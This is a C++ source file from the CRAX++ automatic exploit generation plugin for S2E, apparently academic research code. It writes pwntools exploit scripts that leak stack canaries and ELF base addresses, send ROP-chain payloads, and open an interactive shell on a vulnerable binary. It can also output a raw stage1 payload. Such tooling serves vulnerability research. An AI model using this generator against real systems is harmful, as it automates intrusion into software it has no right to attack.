// Copyright 2021-2022 Software Quality Laboratory, NYCU.
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

#include <s2e/Plugins/CRAX/CRAX.h>
#include <s2e/Plugins/CRAX/RopChainBuilder.h>
#include <s2e/Plugins/CRAX/Expr/BinaryExprEvaluator.h>
#include <s2e/Plugins/CRAX/Modules/IOStates.h>
#include <s2e/Plugins/CRAX/Pwnlib/Util.h>
#include <s2e/Plugins/CRAX/Techniques/Technique.h>
#include <s2e/Plugins/CRAX/Utils/StringUtil.h>

#include <fstream>

#include "ExploitGenerator.h"

namespace s2e::plugins::crax {

using RopSubchain = Technique::RopSubchain;

void ExploitGenerator::run() {
    if (g_crax->getUserSpecifiedCanary() || g_crax->getUserSpecifiedElfBase()) {
        if (generateStage1Payload()) {
            log<WARN>() << "Generated stage1 payload: stage1.bin\n";
        } else {
            log<WARN>() << "Failed to generate stage1 payload.\n";
        }
    } else {
        if (generateFullExploitScript()) {
            log<WARN>()
                << "Generated exploit: "
                << g_crax->getExploit().getFilename(g_crax->getCurrentState()->getID())
                << '\n';
        } else {
            log<WARN>() << "Failed to generate exploit.\n";
        }
    }
}

bool ExploitGenerator::generateFullExploitScript() {
    S2EExecutionState *state = g_crax->getCurrentState();
    Exploit &exploit = g_crax->getExploit();

    exploit.reset();
    m_ropChainBuilder.reset();

    // Write exploit shebang.
    exploit.writeline(Exploit::s_shebang);

    // Pwntools stuff.
    exploit.writelines({
        "from pwn import *",
        "context.update(arch = 'amd64', os = 'linux', log_level = 'info')",
        "",
        format("elf = ELF('%s', checksec=False)", exploit.getElfFilename().c_str()),
    });

    // Initialize techniques and check their requirements.
    std::vector<Technique *> techniques = g_crax->getTechniques();
    for (auto t : techniques) {
        if (!t->checkRequirements()) {
            log<WARN>() << "Requirements unsatisfied: " << t->toString() << '\n';
            return false;
        }
        log<WARN>() << "Initializing technique: " << t->toString() << '\n';
        t->initialize();
    }

    exploit.registerSymbol("canary", 0);
    exploit.registerSymbol("elf_base", 0);

    // Declare symbols and values.
    for (const auto &entry : exploit.getSymtab()) {
        const auto &name = entry.first;
        const auto &value = entry.second;
        exploit.writeline(format("%s = 0x%llx", name.c_str(), value));
    }

    exploit.writeline();

    // Define solve_stage1() function.
    exploit.writeline("def solve_stage1(canary, elf_base, iostates) -> bytes:");
    exploit.setIndentLevel(4);
    exploit.writelines({
        "os.system('./launch-crax.sh -c {} -e {} -s {}'.format(hex(canary), hex(elf_base), iostates))",
        "with open('stage1.bin', 'rb') as f:",
        "    return f.read()",
    });
    exploit.setIndentLevel(0);
    exploit.writeline();

    // Write exploit body.
    exploit.writeline("if __name__ == '__main__':");
    exploit.setIndentLevel(4);
    exploit.writeline("proc = elf.process()");

    // LAEG's LeakExploit().
    auto iostates = dynamic_cast<IOStates *>(CRAX::getModule("IOStates"));
    assert(iostates && "Current implementation of CRAX++ requires IOStates");

    auto modState = g_crax->getPluginModuleState(state, iostates);

    if (modState->currentLeakTargetIdx < iostates->getLeakTargets().size()) {
        log<WARN>() << "Some information cannot be leaked, skipping current state...\n";
        return false;
    }

    iostates->print();

    uint64_t nrSkippedBytes = 0;

    for (size_t i = 0; i < modState->stateInfoList.size(); i++) {
        using InputStateInfo = IOStates::InputStateInfo;
        using OutputStateInfo = IOStates::OutputStateInfo;
        exploit.writeline();

        const auto &info = modState->stateInfoList[i];

        if (const auto stateInfo = std::get_if<InputStateInfo>(&info)) {
            exploit.writeline(format("# input state (offset = %d)", stateInfo->offset));

            std::string byteString = toByteString(stateInfo->buf.begin(),
                                                  stateInfo->buf.begin() + stateInfo->offset);

            if (i != modState->lastInputStateInfoIdx) {
                exploit.writeline(format("proc.send(%s)", byteString.c_str()));
                nrSkippedBytes += stateInfo->offset;
                continue;
            }

            exploit.writeline("# rop chain");
            for (auto t : techniques) {
                if (!m_ropChainBuilder.chain(*t)) {
                    return false;
                }
            }

            std::vector<RopSubchain> ropChain = m_ropChainBuilder.build();
            for (size_t j = 0; j < ropChain.size(); j++) {
                if (j == 0) {
                    const auto &checksec = g_crax->getExploit().getElf().getChecksec();
                    if (checksec.hasCanary || checksec.hasPIE) {
                        exploit.writeline(
                                format("payload  = solve_stage1(canary, elf_base, '%s')[%d:]",
                                    modState->toString().c_str(), nrSkippedBytes));
                    } else {
                        assert(ropChain[0].size() == 1);
                        auto bve = dyn_cast<ByteVectorExpr>(ropChain[0][0]);
                        std::vector<uint8_t> bytes = bve->getBytes();
                        bytes = std::vector<uint8_t>(bytes.begin() + nrSkippedBytes, bytes.end());
                        std::string s = evaluate<std::string>(ByteVectorExpr::create(bytes));
                        replaceCanary(s, iostates->getCanary());
                        exploit.appendRopPayload(s);
                    }
                } else {
                    for (const ref<Expr> &e : ropChain[j]) {
                        exploit.appendRopPayload(evaluate<std::string>(e));
                    }
                }
                exploit.flushRopPayload();
            }

        } else if (const auto stateInfo = std::get_if<OutputStateInfo>(&info)) {
            exploit.writeline("# output state");

            if (!stateInfo->valid) {
                exploit.writeline("proc.recvrepeat(0.1)");
                continue;
            }

            exploit.writeline(
                    format("# leaking: %s", IOStates::s_leakTypes[stateInfo->leakType].c_str()));

            if (stateInfo->leakType == IOStates::LeakType::CANARY) {
                exploit.writelines({
                    format("proc.recv(%d)", stateInfo->bufIndex),
                    "canary = u64(b'\\x00' + proc.recv(7))",
                    "log.info('leaked canary: {}'.format(hex(canary)))",
                });
            } else {
                exploit.writelines({
                    format("proc.recv(%d)", stateInfo->bufIndex),
                    "elf_leak = u64(proc.recv(6).ljust(8, b'\\x00'))",
                    format("elf_base = elf_leak - 0x%x", stateInfo->baseOffset),
                    "log.info('leaked elf_base : {}'.format(hex(elf_base)))",
                });
            }
        }
    }

    // Write exploit trailer.
    exploit.writeline("proc.interactive()");

    // Write the buffered content to the file.
    std::ofstream ofs(exploit.getFilename(state->getID()));
    ofs << exploit.getContent();

    return true;
}

bool ExploitGenerator::generateStage1Payload() {
    m_ropChainBuilder.reset();

    std::vector<Technique *> techniques = g_crax->getTechniques();
    for (auto t : techniques) {
        if (!t->checkRequirements()) {
            log<WARN>() << "Requirements unsatisfied: " << t->toString() << '\n';
            return false;
        }
        log<WARN>() << "Initializing technique: " << t->toString() << '\n';
        t->initialize();
    }

    if (auto elfBase = g_crax->getUserSpecifiedElfBase()) {
        log<WARN>()
            << "Constraining elfBase to " << hexval(elfBase)
            << " as requested.\n";

        g_crax->getExploit().getElf().setBase(elfBase);
    }

    for (auto t : techniques) {
        if (!m_ropChainBuilder.chain(*t)) {
            return false;
        }
    }

    std::vector<RopSubchain> ropChain = m_ropChainBuilder.build();
    assert(ropChain[0].size() == 1);

    auto bve = dyn_cast<ByteVectorExpr>(ropChain[0][0]);
    std::vector<uint8_t> bytes = bve->getBytes();

    // Write the payload to the file.
    std::ofstream ofs("stage1.bin", std::ios::binary);
    ofs.write(reinterpret_cast<const char *>(bytes.data()), bytes.size());

    return true;
}


void ExploitGenerator::replaceCanary(std::string &byteString,
                                     uint64_t canary) const {
    // Maybe replace canary.
    // XXX: currently our canary cannot survive input transformation...
    if (g_crax->getExploit().getElf().getChecksec().hasCanary) {
        assert(canary && "Canary is enabled but not intercepted?");

        std::string canaryBytes;  // in "\xff\xff..." form
        for (auto __byte : p64(canary)) {
            canaryBytes += format("\\x%02x", __byte);
        }
        byteString = replace(byteString, canaryBytes, "' + canary + b'");
    }
}

}  // namespace s2e::plugins::crax
